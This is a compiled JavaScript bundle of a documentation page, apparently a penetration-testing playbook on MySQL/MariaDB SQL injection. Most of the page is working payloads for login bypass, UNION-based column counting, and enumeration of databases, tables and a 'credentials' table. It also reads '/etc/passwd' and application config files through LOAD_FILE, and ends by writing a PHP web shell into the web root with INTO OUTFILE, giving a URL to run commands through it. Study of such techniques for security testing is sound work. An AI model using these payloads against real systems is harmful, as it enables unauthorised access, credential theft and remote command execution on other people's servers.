"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[7386],{682:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>o});const i=JSON.parse('{"id":"Hacking/Playbooks/SQL injections","title":"SQL injections","description":"This article describes some tricks for successful SQL injection. The commands describe here apply only for MySQL/MariaDB, but similar approach can be taken for any other relational databases.","source":"@site/docs/Hacking/Playbooks/SQL injections.md","sourceDirName":"Hacking/Playbooks","slug":"/playbooks/sqli","permalink":"/docs/playbooks/sqli","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/playbooks/sqli","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var r=s(4848),l=s(8453);const a={slug:"/playbooks/sqli",pagination_next:null,pagination_prev:null},t=void 0,c={},o=[{value:"Comments",id:"comments",level:2},{value:"URL encode",id:"url-encode",level:2},{value:"Query logic",id:"query-logic",level:2},{value:"Union",id:"union",level:2},{value:"Enumerating through SQL injection",id:"enumerating-through-sql-injection",level:2},{value:"Databases",id:"databases",level:3},{value:"Tables",id:"tables",level:3},{value:"Table columns",id:"table-columns",level:3},{value:"User privileges",id:"user-privileges",level:2},{value:"Reading",id:"reading",level:3},{value:"Writing",id:"writing",level:3}];function d(e){const n={code:"code",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.p,{children:"This article describes some tricks for successful SQL injection. The commands describe here apply only for MySQL/MariaDB, but similar approach can be taken for any other relational databases."}),"\n",(0,r.jsx)(n.h2,{id:"comments",children:"Comments"}),"\n",(0,r.jsxs)(n.p,{children:["When trying to make the SQL injection, remember that SQL has different comment characters: ",(0,r.jsx)(n.code,{children:"#"}),"  and ",(0,r.jsx)(n.code,{children:"--"}),". Mind the space in the last one, it's better to use ",(0,r.jsx)(n.code,{children:"-- -"})," char for this kind of escape."]}),"\n",(0,r.jsx)(n.h2,{id:"url-encode",children:"URL encode"}),"\n",(0,r.jsx)(n.p,{children:"If you are trying to discover a SQL injection and you fail, remember that you might need to use the URL-encoded characters:"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Character"}),(0,r.jsx)(n.th,{children:"URL Encoded Character"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"'"}),(0,r.jsx)(n.td,{children:"%27"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:'"'}),(0,r.jsx)(n.td,{children:"%22"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"#"}),(0,r.jsx)(n.td,{children:"%23"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:";"}),(0,r.jsx)(n.td,{children:"%3B"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:")"}),(0,r.jsx)(n.td,{children:"%29"})]})]})]}),"\n",(0,r.jsx)(n.h2,{id:"query-logic",children:"Query logic"}),"\n",(0,r.jsxs)(n.p,{children:["Remember you can subvert any query logic by using the ",(0,r.jsx)(n.code,{children:"AND"})," and ",(0,r.jsx)(n.code,{children:"OR"})," operators, e.g:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';\n"})}),"\n",(0,r.jsx)(n.p,{children:"If you are free to input any value in admin you can ignore the AND:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';\n"})}),"\n",(0,r.jsx)(n.p,{children:"Another example, you can just not only ignore the conditions but change them:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE ((username='admin') AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'\n"})}),"\n",(0,r.jsx)(n.p,{children:"username = other')) OR id=5'--"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM logins WHERE ((username='username = other')) OR id=5'--) AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'\n"})}),"\n",(0,r.jsx)(n.p,{children:"And you will log-in as user with ID 5"}),"\n",(0,r.jsx)(n.h2,{id:"union",children:"Union"}),"\n",(0,r.jsxs)(n.p,{children:["You can abuse the SQL injection to extract info from any table using the ",(0,r.jsx)(n.code,{children:"UNION"})," clause. You just need to know the number of columns."]}),"\n",(0,r.jsx)(n.p,{children:"You can combine the outputs of two tables provided they have the same number of columns."}),"\n",(0,r.jsx)(n.p,{children:"In order to know the number of columns, you can use the following methods:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:"Order by: you can pass the number of column to sort by: 1,2,3, keep trying until you got an error. That's the number of columns."}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsxs)(n.p,{children:["Union: similar to the last one but provide the colums to a union query: ",(0,r.jsx)(n.code,{children:"UNION select 1,2,3"}),". When it fails, you'll know the max number of columns."]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"This last method provides the benefit that you see in the UI if there are some hidden column."}),"\n",(0,r.jsx)(n.h2,{id:"enumerating-through-sql-injection",children:"Enumerating through SQL injection"}),"\n",(0,r.jsx)(n.p,{children:"You can extract the information in the database via SQL injection. However, first you must know the databases inside, the tables and the structure of them."}),"\n",(0,r.jsx)(n.p,{children:"No worries, you can make use of the table metadata to obtain this information:"}),"\n",(0,r.jsx)(n.h3,{id:"databases",children:"Databases"}),"\n",(0,r.jsx)(n.p,{children:"All available databases"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n"})}),"\n",(0,r.jsx)(n.p,{children:"Current database"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select 1,database(),2,3-- -\n"})}),"\n",(0,r.jsx)(n.h3,{id:"tables",children:"Tables"}),"\n",(0,r.jsxs)(n.p,{children:["All available tables in database ",(0,r.jsx)(n.code,{children:"dev"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'\n"})}),"\n",(0,r.jsx)(n.h3,{id:"table-columns",children:"Table columns"}),"\n",(0,r.jsx)(n.p,{children:"All available columns in table 'credentials'"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'\n"})}),"\n",(0,r.jsx)(n.h2,{id:"user-privileges",children:"User privileges"}),"\n",(0,r.jsx)(n.p,{children:"In certain conditions the user might be authorized to read/write files from the database. First of all you need to know the privileges of the current user:"}),"\n",(0,r.jsx)(n.p,{children:"To know the user running the database:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT 1, user(), 3, 4\n"})}),"\n",(0,r.jsx)(n.p,{children:"Check if the user is a super-user:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:'SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"\n'})}),"\n",(0,r.jsx)(n.p,{children:"List all privileges of user:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee=\"'root'@'localhost'\"\n"})}),"\n",(0,r.jsx)(n.h3,{id:"reading",children:"Reading"}),"\n",(0,r.jsxs)(n.p,{children:["If ",(0,r.jsx)(n.code,{children:"FILE"})," privilege is granted for the user, you might be able to read any system file from the database engine:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"SELECT LOAD_FILE('/etc/passwd');\nSELECT 1, LOAD_FILE(\"/var/www/html/search.php\"), 3, 4\n"})}),"\n",(0,r.jsx)(n.p,{children:"This will work provided the user running the database has read access in the OS."}),"\n",(0,r.jsxs)(n.p,{children:["You can use ",(0,r.jsx)(n.code,{children:"TO_BASE64"})," function for convinience:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:'SELECT 1, TO_BASE64(LOAD_FILE("/var/www/html/config.php")), 3, 4\n'})}),"\n",(0,r.jsx)(n.p,{children:"And later decode it:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"cat /tmp/b.txt | tr -d ' ' | base64 -d  > /tmp/b.php\n"})}),"\n",(0,r.jsxs)(n.p,{children:["Note that displaying the base64 added some whitespaces which ",(0,r.jsx)(n.code,{children:"base64"})," command dislikes. You can use ",(0,r.jsx)(n.code,{children:"tr"})," to remove those chars."]}),"\n",(0,r.jsx)(n.h3,{id:"writing",children:"Writing"}),"\n",(0,r.jsx)(n.p,{children:"There are some requirements to be able to write a file from the database:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"FILE"})," privilege"]}),"\n",(0,r.jsxs)(n.li,{children:["Global ",(0,r.jsx)(n.code,{children:"secure_file_priv"})," variable not enabled"]}),"\n",(0,r.jsx)(n.li,{children:"The user running the database must have write access to the destination"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"You can check the global variable with a query like:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:'SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"\n'})}),"\n",(0,r.jsx)(n.p,{children:"If the conditions are met, writing to a file is simple:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:"select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'\n"})}),"\n",(0,r.jsx)(n.p,{children:"Then, you can try more advanced stuff, like writing a web shell:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-sql",children:'select "",\'<?php system($_REQUEST[0]); ?>\', "", "" into outfile \'/var/www/html/shell.php\'\n'})}),"\n",(0,r.jsxs)(n.p,{children:["The attacker might run this web-shell from http://SERVER_IP",":PORT","/shell.php?0=id"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>a,x:()=>t});var i=s(6540);const r={},l=i.createContext(r);function a(e){const n=i.useContext(l);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);